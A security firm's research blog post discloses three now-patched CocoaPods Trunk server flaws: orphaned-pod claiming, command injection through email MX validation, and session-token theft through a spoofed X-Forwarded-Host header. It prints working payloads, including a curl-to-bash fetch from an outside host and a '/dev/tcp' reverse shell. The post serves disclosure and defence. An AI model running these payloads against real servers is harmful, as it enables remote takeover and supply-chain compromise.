---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-07-01_vulnerabilities-in-cocoapods-open-the-door-to-supply-chain-attacks-against-thous.md
original_filename: 2024-07-01_vulnerabilities-in-cocoapods-open-the-door-to-supply-chain-attacks-against-thous.md
title: Vulnerabilities In CocoaPods Open The Door To Supply Chain Attacks Against
  Thousands Of iOS And MacOS Applications
category: documents
detected_topics:
- supply-chain
- command-injection
- api-security
- mobile-security
- sso
- password-reset
tags:
- imported
- documents
- supply-chain
- command-injection
- api-security
- mobile-security
- sso
- password-reset
language: en
raw_sha256: 9f24ca404b6e5dc47ca80f72bef0988602c131727af2b3e00c0f4cdfa9fc4951
text_sha256: a0f4172b2d13e3718e23affcc2c1427ab30f8b58ced6ec2c9fc7e8e6a9700074
ingested_at: '2026-06-28T07:32:34Z'
sensitivity: unknown
redactions_applied: false
---

# Vulnerabilities In CocoaPods Open The Door To Supply Chain Attacks Against Thousands Of iOS And MacOS Applications

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-07-01_vulnerabilities-in-cocoapods-open-the-door-to-supply-chain-attacks-against-thous.md
- Source Type: markdown
- Detected Topics: supply-chain, command-injection, api-security, mobile-security, sso, password-reset
- Ingested At: 2026-06-28T07:32:34Z
- Redactions Applied: False
- Raw SHA256: `9f24ca404b6e5dc47ca80f72bef0988602c131727af2b3e00c0f4cdfa9fc4951`
- Text SHA256: `a0f4172b2d13e3718e23affcc2c1427ab30f8b58ced6ec2c9fc7e8e6a9700074`


## Content

---
title: "Vulnerabilities In CocoaPods Open The Door To Supply Chain Attacks Against Thousands Of iOS And MacOS Applications"
page_title: "Vulnerabilities in CocoaPods Open the Door to Supply Chain Attacks Against Thousands of iOS and MacOS Applications"
url: "https://www.evasec.io/blog/eva-discovered-supply-chain-vulnerabities-in-cocoapods"
final_url: "https://www.evasec.io/blog/eva-discovered-supply-chain-vulnerabities-in-cocoapods"
authors: ["Reef Spektor", "Eran Vaknin"]
programs: ["CocoaPods"]
bugs: ["RCE", "Account takeover", "Supply chain attack", "iOS", "MacOS"]
publication_date: "2024-07-01"
added_date: "2024-07-22"
source: "pentester.land/writeups.json"
original_index: 208
---

[![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/690b58e6bea9b987670152ef_eva-logo-white.png)](/)

  * [Home](/)
  * [Services](/services)
  * [Blog](/blog)
  * [About us](/about-us)
  * [Contact us](/contact-us)

Research

July 1, 2024

# Vulnerabilities in CocoaPods Open the Door to Supply Chain Attacks Against Thousands of iOS and MacOS Applications

Multiple vulnerabilities affecting the CocoaPods ecosystem, have been discovered, posing a major risk of supply chain attacks.

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/667edfaf3163605ea44d1da0_portrait2.jpg)

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/665519d6eeeaa979ade532b3_PHOTO-2024-05-28-01-38-28.jpg)

[Reef Spektor](https://www.linkedin.com/in/reef-spektor-02988418b)

[![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/690b58e6bea9b987670152ef_eva-logo-white.png)](/)

  * [Home](/)
  * [Services](/services)
  * [Blog](/blog)
  * [About us](/about-us)
  * [Contact us](/contact-us)

,

[Eran Vaknin](https://www.linkedin.com/in/eran-vaknin)

[![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/690b58e6bea9b987670152ef_eva-logo-white.png)](/)

  * [Home](/)
  * [Services](/services)
  * [Blog](/blog)
  * [About us](/about-us)
  * [Contact us](/contact-us)

,

X

minutes read

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ee7_x.svg)![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ee8_linkedin.svg)![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ee9_reddit.svg)

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/666ee5b3de77bc88bb5dc068_EVA_Infographics_Cover_A.jpg)

  
Contents

## TL;DR  

  * E.V.A Information Security researchers uncovered several vulnerabilities in the CocoaPods dependency manager that allows any malicious actor to claim ownership over thousands of unclaimed pods and insert malicious code into many of the most popular iOS and MacOS applications. These vulnerabilities have since been patched.
  * Such an attack on the mobile app ecosystem could infect almost every Apple device, leaving thousands of organizations vulnerable to catastrophic financial and reputational damage. One of the vulnerabilities could also enable zero day attacks against the most advanced and secure organizations’ infrastructure. 
  * Developers and DevOps teams that have used CocoaPods in recent years should verify the integrity of open source dependencies used in their application code.
  * Dependency managers are an often-overlooked aspect of software supply chain security. Security leaders should explore ways to increase governance and oversight over the use these tools.

## Spilling the CocoaBeans

Open source code is ubiquitous in modern software development. When reviewing client code, it’s not unusual for us to find that 70-80% is composed of open source libraries, packages, or frameworks. While adoption of open source is practically inevitable, it also increases the risk of software supply chain attacks. Once an open source package is integrated into a company's continuous integration and continuous delivery (CI/CD) pipeline, there is a risk that the package could be compromised or manipulated to inject malicious code or vulnerabilities into any applications built using that pipeline. In recent years, many such attacks have occurred ([Log4Shell](https://en.wikipedia.org/wiki/Log4Shell) is probably the most famous example).

With about 100,000 libraries used in over 3 million mobile apps, [CocoaPods](https://cocoapods.org/) is an open source dependency manager for Swift and Objective-C projects. Dependency managers such as CocoaPods and others (including NPM, Maven, and PyPI) play a critical role in open source software supply chains. By checksumming and cryptographically signing packages, they allow developers to verify the integrity and authenticity of the components they’re using. However, compromise of the dependency manager itself poses a severe threat. Attackers who infiltrate the servers or developer accounts of these tools could push malicious updates that spread widely. 

As part of a red team exercise for a customer, we have discovered several critical vulnerabilities in the mechanisms used to manage packages and verify their owners on the CocoaPods server. 

## Vulnerabilities in the CocoaPods Ecosystem

  * A 2014 migration process left thousands of orphaned packages (where the original owner is unknown), many of which are still widely used in other libraries. Using a public API and an email address that was available in the CocoaPods source code, an attacker could claim ownership over any of these packages, which would then allow the attacker to replace the original source code with their own malicious code.
  * An insecure email verification workflow could be exploited to run arbitrary code on the CocoaPods ‘Trunk’ server (manages the distribution and metadata of [Podspecs](https://guides.cocoapods.org/syntax/podspec.html)), which would allow an attacker to manipulate or replace the packages being downloaded. 
  * By spoofing an HTTP header and taking advantage of misconfigured email security tools, attackers could execute a zero-click attack that grants them access to a developer’s account verification token. This would allow attackers to change packages on the CocoaPods server and result in supply chain and zero day attacks. 
  * A separate vulnerability would allow an attacker to infiltrate the CocoaPods ‘Trunk’ server and perform a near-unlimited range of exploits.. 

## Who is Vulnerable

The short answer is that a significant percentage of the Swift and Objective-C application ecosystem (including iOS, macOS, and other Apple device software) was susceptible to supply chain and zero-click attacks, with an estimated range of thousands to millions of apps.

As with many software supply chain attacks, opaque dependencies in closed-source code mean it is almost impossible to understand the potential harm. The vulnerabilities we discovered could be used to control the dependency manager itself, and any published package.  
[Downstream dependencies](https://en.wikipedia.org/wiki/Downstream_\(software_development\)) could mean that thousands of applications and millions of devices were exposed over the last few years. 

Special attention needs to be paid to **software that relies on orphaned CocoaPod packages** (i.e., which do not have an owner assigned to them - more on this below). 

<figure class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://eva-research.imgix.net/EVA_Infographics_gif1.gif" loading="lazy" alt="" class="medium-zoom-image"></div></figure>

## The Potential Impact

CocoaPods is the most popular choice among iOS developers. Many of the potentially impacted artifacts are dependencies for projects maintained by major companies such as Google, GitHub, Amazon, Dropbox, and more - which puts the projects and downstream dependencies at risk.

These potential affected end-user apps deployed on millions (billions?) of devices could damage users and companies reputations. Many applications can access a user’s most sensitive information: credit card details, medical records, private materials, and more. Injecting code into these applications could enable attackers to access this information for almost any malicious purpose imaginable - ransomware, fraud, blackmail, corporate espionage… In the process, it could expose companies to major legal liabilities and reputational risk.

## Actions Developers Should Take

Developers and organizations are advised to review dependency lists and package managers used in their applications, validate checksums of third-party libraries, perform periodic scans to detect malicious code or suspicious changes, keep software updated and limit use of orphaned or unmaintained packages.

If CocoaPods was in use in your organization before October 2023, you should take extra care to perform the steps detailed under Technical Remediation Steps.

## Vulnerabilities Disclosure

We [informed CocoaPods](https://blog.cocoapods.org/CocoaPods-Trunk-RCEs-2023/) and provided the full details of the vulnerabilities according to the responsible disclosure guidelines which since patched.

## <u>Technical Details</u>

## #1: Taking Unauthorized Ownership over Orphaned Pods

A Podspec is a specification file used by CocoaPods to describe a package, known as a Pod. It includes metadata like the name, version, source files, dependencies, and other information required to correctly integrate that Pod into an iOS or macOS project. When contributing a Podspec to CocoaPods, the authors are required to register an account. In their account, they can store and maintain their Pods and Podspecs. Authors are entitled to upload new packages and update existing ones.

Cocoapods originally identified the authors using their GitHub-associated accounts. In May 2014, CocoaPods announced a migration to a new ['Trunk’ server](https://github.com/CocoaPods/trunk.cocoapods.org), which now acts as a centralized repository and distribution platform for CocoaPods. The migration would allow Podspec authors to publish their Pods and make them available to the community using a new web service application. The new flow included email validation, and was probably meant to improve security.

As part of the migration, authorship of all previously uploaded Pods was reset. Authors were asked to claim ownership of their Pods in order to retain control over their contents. However, many of the original Podspec authors did not do so, resulting in many pods left unclaimed (orphaned). At the time of this writing, there are [1,866 orphaned pods](https://cocoapods.org/owners/7).

### The vulnerability (CVE-2024-38368)

By analyzing the source code of the ‘Trunk’ server, we noticed that all orphan pods were associated with a default CocoaPods owner, and the email created for this default owner was [unclaimed-pods@cocoapods.org](mailto:unclaimed-pods@cocoapods.org). 

In addition, we noticed that the public API endpoint to claim a pod was still available and the API allowed anyone to claim orphaned pods without any ownership verification process. 

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de23c_665b731f0cb57120e44a4f56_claimscontroller.png)

Trunk server's App controller including "temporary" **/claims** routes

### The exploit

By making a straightforward curl request to the publicly-available API, and supplying the unclaimed targeted pod name, the door was wide open for a potential attacker to claim any or all of these orphaned Pods as their own:
  
  
  # Curl request for changing ownership of a targeted orphaned pod
  curl -X 'POST' \
  -H 'Host: trunk.cocoapods.org' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'owner[name]=EVA&email=research@evasec.io'
  --data-binary 'pods[]=[TARGET_UNCLAIMED_POD]&button=SEND'
  'https://trunk.cocoapods.org/claims'
  
  

At this point, the attacker would be able to manipulate the source code or insert malicious content into the newly-claimed Pod. This pod would then go on to infect many downstream dependencies, and potentially find its way into **a large percentage of Apple devices currently in use**.

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b0750a2a8f8f43a1de2c0_666ee4f103b80163c26b4a95_EVA_InfoGraphics_C1.jpeg)

### The implications

‍**Many of these unclaimed Pods are still in wide use.** Orphaned Pods are used as dependencies of many other packages available on CocoaPods. For example, we found mentions of orphaned Pods in the documentation or terms of service documents of applications provided by Meta (Facebook, Whatsapp), Apple (Safari, AppleTV, Xcode), and Microsoft (Teams); as well as in TikTok, Snapchat, Amazon, LinkedIn, Netflix, Okta, Yahoo, Zynga, and many more. Overall we found 685 Pods that had an explicit dependency using an orphaned Pod; doubtless there are hundreds or thousands more in proprietary codebases. All of these were, at some period or another, vulnerable to the supply chain attack described below. 

By taking ownership of a part of the iOS/macOS app supply chain, and based on the documented dependencies we mentioned above, an attacker would have free reign to access millions of mobile apps and the hundreds of millions of people that use them. 

## #2: Remote Code Execution on the CocoaPods 'Trunk' Server

On February 8, 2014, a change was [committed](https://github.com/CocoaPods/trunk.cocoapods.org/commit/70c56fba99d53fa5a8930dd4d0d392e4c99a56c4) to the CocoaPods ‘Trunk’ source code, implementing MX record validation to registered emails. These changes created a new attack path that was identified by analyzing the registration flow.

  1. To register as pod owner using the CocoaPods CLI tool, developers provide their email, name, and account description.
  2. The server verifies the email's uniqueness and checks if it follows the correct format, according to the[ RFC822](https://datatracker.ietf.org/doc/html/rfc822) standard (using regular expressions).
  3. The server then examines the email address domain's Mail Exchanger (MX) records to confirm email validity, using the RFC-822 ruby [package](https://github.com/dim/rfc-822)
  4. If everything checks out, the developer's owner account is created, allowing them to access the ‘Trunk’ server and manage owned CocoaPod packages.

### The vulnerability (CVE-2024-38366)

The changes include a new verification process for the user-provided email address, utilizing a third-party ruby gem package [rfc-822](https://github.com/dim/rfc-822).

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de273_66547c29f67b1ab7f79b21e6_commit.png)

_CocoaPods ‘Trunk’ server commit - implementing rfc822 host validation_

The _validates_mx_records_ method declared through lines 70-73, calls _RFC822.mx_records_ method.

Unfortunately, RFC822 has several vulnerable methods:

**Lines 36-47 -_mx_records_ method** receives an email address as input parameter, validates it against the module’s EMAIL regex pattern (line 38). Following the regex validation, the _raw_mx_records_ method is called with the domain part of the email address, split from the provided email address (line 41)

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de248_66546f31b3de5dfcd5785f3b_xOOC9SSDj2wOo_8bNTchKPo9_5I9sxxj47l4_LMIjmZLYJVugCz16zfzH-8TADNrDxSpwoktWUUMvT4xtWmNuYZEit6_jchmxxyTwXqPLLKihJK5lkxh6PBL6oRWwQPHpLJrNjJhyz6hydOcLqaCcJ4.png)

rfc-822 implementation of the vulnerable methods

**Lines 49-51 -_raw_mx_records_** method receives the domain part of the email address and forwards it to _host_mx_ method for online DNS MX record validation. The output is executed against a regex pattern to obtain the relevant host.

**Lines 53-55 -_host_mx_** method executes an arbitrary OS command _‘/usr/bin/env host -t MX #{domain}’_ , concatenating it with the user-provided email’s domain which makes it vulnerable to a Command Injection attack.

### The exploit

<figure class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://eva-research.imgix.net/EVA_Infographics_gif3.gif" loading="lazy" alt="" class="medium-zoom-image"></div></figure>

To pop a new reverse shell from the ‘Trunk’ server, we needed to come up with the following set of payloads:

Email address to register with:

<span class="cool-inline">_name@pwn.evaresearch.com|bash_ </span>

MX record of pwn.evaresearch.com:

<span class="cool-inline">_10 a||{curl, -s,http://serve.evasecresearch.com/payload.txt}|bash||.com_ </span>

Serve the following payload file at http://serve.evasecresearch.com/payload.txt:

<span class="cool-inline">_sh -i >& /dev/tcp/SERVER/1337 0>&1_</span>

As mentioned earlier, the method _rfc-822.rb#host_mx_ is executing OS _‘host’_ command against the provided email address without proper validation, allowing us to inject a trailing ‘bash’ command (**_|bash_**) against any resolution of our controlled MX record domain. This means that any MX record resolution value containing a valid bash command syntax will be executed on the ‘Trunk’ server in the context of the ‘host’ command.

In our example above, we’ve served a reverse shell payload (payload.txt file) via our controlled HTTP server.

<b>For a comprehensive exploration of the research process behind this vulnerability, [click here](https://github.com/ReeFSpeK/CocoaPods-RCE)</b>

### The implications

If an unauthorized threat actor compromises the server, they could potentially dump all pod owners’ session tokens, poison client’s traffic or even shut down the server completely. 

## #3: Achieving Zero-Click Account Takeover by Defeating Email Security Boundaries

Several HTTP headers present opportunities for attackers, notably including [HTTP smuggling and desynchronization attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) (credit to [James Kettle](https://portswigger.net/research/james-kettle) for research around those interesting topics). These attacks exploit variations in how servers and proxies interpret headers, enabling malicious requests to deceive systems, and potentially leading to unintended actions or security bypasses. 

<figure class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://eva-research.imgix.net/EVA_Infographics_gif2.gif" loading="lazy" alt="" class="medium-zoom-image"></div></figure>

CocoaPods authenticates a new device through a session creation process. This starts with a request sent by the client to the ‘Trunk’ server in order to obtain a session. The client provides **only** its email address as the authentication method; however, the session will not be valid until the owner visits a link sent to their mailbox.

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de258_6655bc6a4e978ffa35433c15_registercocoa.png)

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de23f_6655bde90e4b16653f24e8f6_cocoaemail.png)

### The vulnerability (CVE-2024-38367)

According to [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host): “The X-Forwarded-Host (XFH) header is a de-facto standard header for identifying the original host requested by the client in the [Host](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Host) HTTP request header”.  

We found that the server will accept a spoofed XFH header and use it explicitly to construct a URL sent to the client for verifying the session.

For example, an attacker can inject the following header to spoof the generated session validation link:

_X-Forwarded-Host:_**_research_** _._**_evasec.io →_** _https://_**_research_** _._**_evasec.io_** _/sessions/verify/[TOKEN] ‍_

 _‍  
_ The vulnerability exists in the ‘Trunk’ server source code, in the _sessions_controller_ class where the application is constructing the session validation url.

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de242_66548229bf07b0f45cc98774_sessions_controller.rb%2520new.png)

_sessions_controller.rb: session creation controller action implementation_

**Lines 21-22 -** The domain part of the session verification URL is constructed using the **request.host_wth_port** method. Also, a new session is created and the generated link is sent via email.

Further analysis of the **_request.host_wth_port_** Rack (Rails) method reveals that the method implementation prioritizes the _X-Forwarded-Host_ header over the original _Host_ header or any other environment value to determine the hostname of the web server. 

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de239_66548294835438fb472e46db_ruby-rack%2520method%2520-new.png)

** _Rack::Request#host_with_port_** _method implementation_

### The exploit

To exploit this vulnerability, an attacker can send the following request including the spoofed XFH header:
  
  
  POST /api/v1/sessions HTTP/1.1
  Host: trunk.cococapods.org
  Content-Type: application/json; charset=utf-8
  Accept: application/json; charset=utf-8
  User-Agent: CocoaPods/1.12.1
  Accept-Encoding: gzip, deflate
  X-Forwarded-Host: research.evasec.io
  Content-Length: 78
  
  {
  "email":"research@evasec.io",
  "name":"EVAResearch",
  "description":null
  }
  

The email generated by the CocoaPods ‘Trunk’ server will include a URL with the spoofed domain as specified above:

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de236_6655ccfcbc997dc38489bf16_cocoaemail2.png)

After receiving the session validation token, it’s possible to access the new link to validate the session and take over the account:

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de24e_6655c75ab6a2e2e8a60744c3_10.png)

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de251_665483283dd887bf469b7bfc_12.png)

You might be asking: _wait, this is a regular one-click attack, where’s the zero-click?_

To ‘upgrade’ the attack into a **zero-click account takeover** we needed the session validation link to be sent automatically from the user’s email inbox to our servers. How would we do that?

#### **Email security products to the rescue**

Nowadays, almost every organization or even the email provider themselves is implementing email security products that are responsible for protecting the mailboxes of its employees from unwanted phishing links. The solutions can detect advanced and clever phishing attacks by just scanning the HTML content and comparing it against dozens of phishing templates they are already familiar with.

Can we use those capabilities to make the email solution scan the spoofed CocoaPods session validation link for a potential phishing attempt and by doing so we will get the token?

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de233_665484ae5b46d8319f7685d3_mrbean.jpeg)

We have found that almost every Pod owner is registered with their organizational email on the Trunk server, which makes them vulnerable to our zero-click takeover vulnerability. For example, Amazon dev emails are registered under their organization’s email system as can seen below:

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de245_66546f313dd887bf4687f5be_HzExDoQBbjF2gS9CDWDPScXsFg95wGkWx5hQat0dpI2ltYvQy52je_4s1g58YFM0q9uR1tUejcBoba905CR_S7kMMWNLgqvOEVdG648rkV5TlSPspqFxDAzCbVMesF05GssYCzvNihSev46Xb8pDQrs.png)

From this point, it was quite simple to take over almost every organizational pod account in the system, since their email security solutions are actively scanning every link sent to their inboxes.

In the screenshot below, we are demonstrating multiple session validation tokens that have been sent to us, meaning we have successfully taken over accounts in the system and we are now controlling them. 

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b074fa2a8f8f43a1de24b_665483a2b57e7451b68cc99f_7.png)

### The implications

Compromising a victim’s account will result in a full takeover of the CocoaPods owned by the account. The threat actor could manipulate pod specifications, disrupt the distribution of legitimate libraries, or cause widespread disruption within the CocoaPods ecosystem.

Using this method, we managed to take over the owner accounts of some of the most popular CocoaPods packages. Potentially we could have used these accounts for highly damaging supply chain attacks that could impact the entire Apple ecosystem.

## Takeaways for Organizations

The vulnerabilities discovered in CocoaPods serve as an important reminder of the risks associated with relying on open-source code and third-party dependencies. 

Today’s software supply chains are incredibly complex, and open-source libraries are deeply integrated into most applications via automated CI/CD pipelines; even when installed on developers’ local machines, malicious code can be used to reach other resources through lateral movements. There is no avoiding this in 2024, but it is important to remain aware of the potential consequences. Insight into the composition of your application code is paramount, as is ensuring the validity and reliability of any open-source dependencies.

Package managers serve an important role in making open-source software available. But they can also become central point of failures and hence require an added layer of vigilance. The CocoaPods team responded responsibly and swiftly to the vulnerabilities once disclosed. However, organizations must be aware of this potential attack surface, and stay informed of the various package and dependency management tools used by developers.

## Technical Remediation Steps

While there is no direct evidence of any of these vulnerabilities being exploited in the wild, evidence of absence is not absence of evidence. 

Potential code changes could affect millions of Apple devices around the world across iPhone, Mac, AppleTV, and AppleWatch devices. Hence, developers who have released applications for any of these platforms should take the following steps to secure their code:

  * Keep your podfile.lock file synchronized with all CocoaPods developers to ensure everyone is on the same version of the packages. This will ensure that when a new, potentially harmful update is committed, developers will not automatically update to it.
  * If you are using a Pod which is developed internally and only hosted in CocoaPods for mass distribution, developers should perform CRC (checksum) validation against the one downloaded from the CocoaPods trunk server to ensure it's the same as the one developed internally (where possible).
  * Implement a thorough security review of any third party code used in your applications.
  * Review CocoaPods dependencies and verify you are not using an orphaned Pod.
  * Ensure you use third party dependencies that are actively maintained and whose ownership is clear.
  * Perform periodic security code scans to detect secrets and malicious code on all external libraries, especially CocoaPods. 
  * Be wary of very widely used dependencies as these could be a more attractive target for potential attackers to exploit. CocoaPods is only the beginning…

Link 1Link 1

## CONTINUE READING

[![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e55/677b06d306e999d3cba53dec_final.jpg)BlogPostDecember 26, 2024Argo Workflows - Uncovering the Hidden MisconfigurationsMisconfigured Argo Workflows may result in a massive supply chain attackRead More![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ee2_link%20arrow.svg)](/blog/argo-workflows-uncovering-the-hidden-misconfigurations)

![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ea5_Asset%202.png)

Company

[Home](/)[Services](/services)[Blog](/blog)[About us](/about-us)[Contact us](/contact-us)

FOLLOW US

[![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ee7_x.svg)](https://twitter.com/eva_info_sec)[![](https://cdn.prod.website-files.com/6637ec84acdca762bbea2e39/6637ec84acdca762bbea2ee8_linkedin.svg)](https://www.linkedin.com/company/evainfosec/)

Ready to connect?

Whether you already have solutions in mind or want to explore options to achieve your offensive security goals, we're ready to help.

[cONTACT US](/contact-us)

Copyright © 2024 E.V.A

[L.D Web Development](mailto:liordan4@gmail.com)
